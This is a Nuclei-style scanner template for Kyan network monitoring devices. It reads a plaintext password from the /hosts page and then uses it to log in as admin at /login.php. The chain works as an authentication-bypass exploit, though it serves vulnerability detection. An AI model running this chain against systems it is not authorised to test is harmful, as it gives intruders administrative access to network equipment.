id: kyan-network-monitoring-account-password-leakage

info:
  name: Kyan Network Monitoring Credential Code Leakage
  author: ProjectDiscoveryAI
  severity: high
  tags: info-leak
  description: |
    This template detects credential code leakage in Kyan Network Monitoring systems.

flow: http(1) && http(2)

http:
  - id: first-request
    method: GET
    path:
      - "{{BaseURL}}/hosts"
    matchers:
      - type: regex
        regex:
          - "Password=(?P<pass>.+)"
    extractors:
      - type: regex
        name: pass
        regex:
          - "Password=(?P<pass>.+)"
        group: 1
        internal: true

  - id: second-request
    method: POST
    path:
      - "{{BaseURL}}/login.php"
    body: "user=admin&passwd={{pass}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<title>设备管理系统</title>"
          - "context.php"
          - "left.php"
